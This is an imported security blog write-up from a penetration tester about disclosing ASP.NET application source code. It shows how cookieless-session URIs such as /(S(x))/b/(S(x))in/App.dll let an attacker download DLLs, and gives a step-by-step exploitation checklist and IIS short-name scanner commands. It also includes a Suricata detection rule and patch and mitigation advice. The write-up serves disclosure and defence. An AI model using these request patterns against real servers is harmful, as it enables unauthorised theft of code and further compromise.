---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-03-07_source-code-disclosure-in-aspnet-apps.md
original_filename: 2024-03-07_source-code-disclosure-in-aspnet-apps.md
title: Source Code Disclosure in ASP.NET apps
category: documents
detected_topics:
- command-injection
- rate-limit
- sso
- idor
- access-control
- xss
tags:
- imported
- documents
- command-injection
- rate-limit
- sso
- idor
- access-control
- xss
language: en
raw_sha256: e431d8df64499a6eeddf1bb2f9cc4c7f27b27b669a6df66866b334904b47143b
text_sha256: 093ce590150325e8aa400708e762002dae5fd39efbfe6ecd2847978baaba73d1
ingested_at: '2026-06-28T07:32:32Z'
sensitivity: unknown
redactions_applied: false
---

# Source Code Disclosure in ASP.NET apps

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-03-07_source-code-disclosure-in-aspnet-apps.md
- Source Type: markdown
- Detected Topics: command-injection, rate-limit, sso, idor, access-control, xss
- Ingested At: 2026-06-28T07:32:32Z
- Redactions Applied: False
- Raw SHA256: `e431d8df64499a6eeddf1bb2f9cc4c7f27b27b669a6df66866b334904b47143b`
- Text SHA256: `093ce590150325e8aa400708e762002dae5fd39efbfe6ecd2847978baaba73d1`


## Content

---
title: "Source Code Disclosure in ASP.NET apps"
page_title: "Source Code Disclosure in ASP.NET apps – PT SWARM"
url: "https://swarm.ptsecurity.com/source-code-disclosure-in-asp-net-apps/"
final_url: "https://swarm.ptsecurity.com/source-code-disclosure-in-asp-net-apps/"
authors: ["Arseniy Sharoglazov (@_mohemiv)"]
bugs: ["Source code disclosure", "ASP.NET"]
publication_date: "2024-03-07"
added_date: "2024-05-08"
source: "pentester.land/writeups.json"
original_index: 391
---

# Source Code Disclosure in ASP.NET apps

Written by [Arseniy Sharoglazov](https://swarm.ptsecurity.com/author/arseniy-sharoglazov/ "Posts by Arseniy Sharoglazov") on March 7, 2024

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/02/8fdda128-preview-2.png)

## Author

![](https://swarm.ptsecurity.com/wp-content/uploads/2020/07/foto_arseniy-150x150.jpg)

[Arseniy Sharoglazov](https://swarm.ptsecurity.com/author/arseniy-sharoglazov/ "Posts by Arseniy Sharoglazov")

Penetration Testing Expert 

[_mohemiv](https://twitter.com/_mohemiv "Visit Arseniy Sharoglazov’s Twitter")

Recently, I came across an interesting ASP.NET application. It appeared to be secure, but it accidentally revealed its source code. Later, I found out that the used method is applicable to disclose code of many other .NET web applications.

Here are the details. If you just see an IIS or .NET app, this is for you.

## Analyzing the App

During an external penetration test, I found a web application. It consisted of two pages on different ports:

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/03/90eda7f7-app-4.png)

Here is a Burp screenshot with relevant HTTP headers:

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/02/e77f69ca-http-headers.png)HTTP headers of the 8444/tcp application

It looked like my application was written in C# on the ASP.NET platform, was functioning under IIS, and was protected by a WAF based on nginx.

Knowing this was enough to bypass the 403 error:

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/03/cce2213a-403-bypass.png)The content of the “/login.aspx” page after bypassing the WAF (via a cookieless session)

After the bypass, I got nothing. There weren’t even any stylesheets present. I attempted to brute force every possible username and password, every possible path and parameter. All efforts were unsuccessful.

Another boring web application? Not today!

## Cookieless Sessions in ASP.NET

When you enable the ASP.NET feature in IIS, any page of the server starts accepting cookieless sessions. 

The ASP.NET cookieless sessions, along with PHP’s and Java’s analogs, have always been used for WAF bypass, as we did, session fixation, XSS, and all kinds of other attacks. 

Here are different formats of these “cookieless sessions”:

**.NET Version**| **URI**  
---|---  
V1.0, V1.1| /(XXXXXXXX)/  
V2.0+| /(S(XXXXXXXX))/  
V2.0+| /(A(XXXXXXXX)F(YYYYYYYY))/  
V2.0+| …  
Source: <https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/aa479315(v=msdn.10)>

Furthermore, Soroush Dalili (a.k.a. [@irsdl](https://twitter.com/irsdl)) recently discovered something new in this area: [Cookieless DuoDrop: IIS Auth Bypass & App Pool Privesc in ASP.NET Framework (CVE-2023-36899 & CVE-2023-36560)](https://soroush.me/blog/2023/08/cookieless-duodrop-iis-auth-bypass-app-pool-privesc-in-asp-net-framework-cve-2023-36899/).

Namely, two security issues in .NET Framework were found and reported. Both were associated with the repetition of a cookieless pattern in the URI twice, potentially leading to a restriction bypass and privilege escalation.

Here are the POCs from Soroush Dalili’s article:

**CVE**| **PoC**  
---|---  
CVE-2023-36899|  /WebForm/(S(X))/prot/(S(X))ected/target1.aspx  
/WebForm/(S(X))/b/(S(X))in/target2.aspx  
CVE-2023-36560|  /WebForm/pro/(S(X))tected/target1.aspx/(S(X))/  
/WebForm/b/(S(X))in/target2.aspx/(S(X))/  
  
Keep in mind these POCs. At that moment, I wasn’t able to imagine any way to apply these POCs for my one-page applications.

## Discovering Source Code Disclosure

I was playing with my websites once every two or three days. It all came to nothing. Just two pages, no username, and no password.

However, one day, this happened:

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/03/c8ea633f-poc.png)

In just one second, the DLL had appeared on my computer! It wasn’t corrupt, and there was a Remote Code Execution discovered inside!

## Investigation

After obtaining the RCE, I was able to access the target’s web.config file. Then, I reduced it to the minimum possible configuration:
  
  
  <?xml version="1.0" encoding="utf-8"?>
  <configuration>
  <system.webServer>
  <modules runAllManagedModulesForAllRequests="true" />
  </system.webServer>
  </configuration>

That was it. The runAllManagedModulesForAllRequests setting was the cause of our success.

## Scaling the POC

It quickly became clear that the technique works on other servers. The setting runAllManagedModulesForAllRequests isn’t rare and I was able to download a few DLLs from different websites the same day.

The only thing I noticed is that it’s impossible to check the existence of the “/bin” directory:
  
  
  http://Y.Y.Y.Y/ - 200
  http://Y.Y.Y.Y/bin - 404
  http://Y.Y.Y.Y/bin/ - 404
  http://Y.Y.Y.Y/bin/Navigator.dll - 404
  http://Y.Y.Y.Y/(S(x))/b/(S(x))in  - 404
  http://Y.Y.Y.Y/(S(x))/b/(S(x))in/ - 404
  http://Y.Y.Y.Y/(S(x))/b/(S(x))in/Navigator.dll - 200

However, by applying IIS-ShortName-Scanner, you can not only check the existence of the “/bin” directory, but also discover its content:

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/02/0f273b4c-IIS-ShortName-Scanner.png)Executing java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'

Both IIS-ShortName-Scanner and the “::$INDEX_ALLOCATION” trick are attributed to Soroush Dalili.

## Full Exploitation Algorithm

Here’s a brief guide on how to check the server on the vulnerability.

**1.** Check if cookieless sessions are allowed.
  
  
  # If your application is in the main folder
  /(S(X))/
  /(Y(Z))/
  /(G(AAA-BBB)D(CCC=DDD)E(0-1))/
  
  # If your application is in a subfolder
  /MyApp/(S(X))/
  ...

**2.** Optionally, use IIS-ShortName-Scanner. Note, its functionality doesn’t depend on whether cookieless sessions are enabled or not.
  
  
  java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
  java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'

In addition to “/bin”, I recommend you to check other special .NET folders:
  
  
  /App_Code
  /App_WebReferences
  /App_GlobalResources
  /App_LocalResources
  /App_Data
  /App_Themes
  /App_Browsers
  /Themes
  /Views
  /Models
  /Controllers

**3.** Explore 404 page.

For `/(S(x))/b/(S(x))in/App.dll` it should write something like `/bin/App.dll` or none in the output. If it’s `.../b/(S(x))in/...` on 404, this means the patches are installed.

**4.** Try to read DLLs. It’s necessary to reconstruct complete filenames from shortened 8.3 format filenames.
  
  
  http://Y.Y.Y.Y/(S(x))/b/(S(x))in/MyApplicationFile.dll
  http://Y.Y.Y.Y/MyApp/(S(x))/b/(S(x))in/MyApplicationFile.dll

The PDB files, if such exists, will not be accessible.

## Attack Detection

A big thank you to Kirill Shipulin of our blue team for preparing the Suricata rule:
  
  
  alert http any any -> any any (msg: "ATTACK [PTsecurity] Cookieless string in ASP.NET"; flow: established, to_server; http.uri; content: "/("; fast_pattern; content: "))"; distance: 0; pcre: "/\/\([A-Z]\(.*?\)\)/"; classtype: attempted-admin; sid: 10009357; rev: 1;)
  

## Conclusion & Mitigations

**For security teams**

Update your Microsoft IIS and .NET Framework to the latest versions. For Windows Server 2019 and .NET Framework 4.7, KB5034619 currently fixes the source disclosure.

For mitigating short name enumerations, run “`fsutil behavior set disable8dot3 1`” to disable 8.3 name creation. Next, reboot your system and run “`fsutil 8dot3name strip /s /v [PATH-TO-WEB-DIRETORY]`” to remove all existing 8.3 file names.

**For pentesters and bughunters**

I would recommend checking for obvious things and tricks, including ones that should not work.

As an example, on a different project, my friend was able to download DLL files from the “/bin” directory directly, even though I have never seen this technique succeed.

## References

This article was based on the following materials:

  * [Microsoft Short File Name Disclosure](https://soroush.me/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf), 2010–2012, Soroush Dalili
  * [Microsoft Short File Name Disclosure in Microsoft IIS 10.0](https://raw.githubusercontent.com/irsdl/IIS-ShortName-Scanner/master/presentation/Steelcon-2023-Beyond_Microsoft_IIS_Short_File_Name_Disclosure.pdf), July 2023, Soroush Dalili
  * [IIS Short Name Scanner](https://github.com/irsdl/IIS-ShortName-Scanner/), 2012–2023, Soroush Dalili
  * [Cookieless DuoDrop: IIS Auth Bypass & App Pool Privesc](https://soroush.me/blog/2023/08/cookieless-duodrop-iis-auth-bypass-app-pool-privesc-in-asp-net-framework-cve-2023-36899/), August 2023, Soroush Dalili
  * [CVE-2023-36560](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36560), 2023, Markus Wulftange ([@mwulftange](https://twitter.com/mwulftange))
  * [CVE-2023-36899](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36899), 2023, Soroush Dalili

Feel free to write your thoughts about the article [on our X page](https://twitter.com/ptswarm). Follow [@ptswarm](https://twitter.com/ptswarm) or [@_mohemiv](https://twitter.com/_mohemiv) so you don’t miss our future research and other publications.

[Arbitrary File Read](https://swarm.ptsecurity.com/tag/arbitrary-file-read/), [MS Windows](https://swarm.ptsecurity.com/tag/ms-windows/), [Penetration Testing](https://swarm.ptsecurity.com/tag/penetration-testing/), [Web Application Security](https://swarm.ptsecurity.com/tag/web-application-security/)
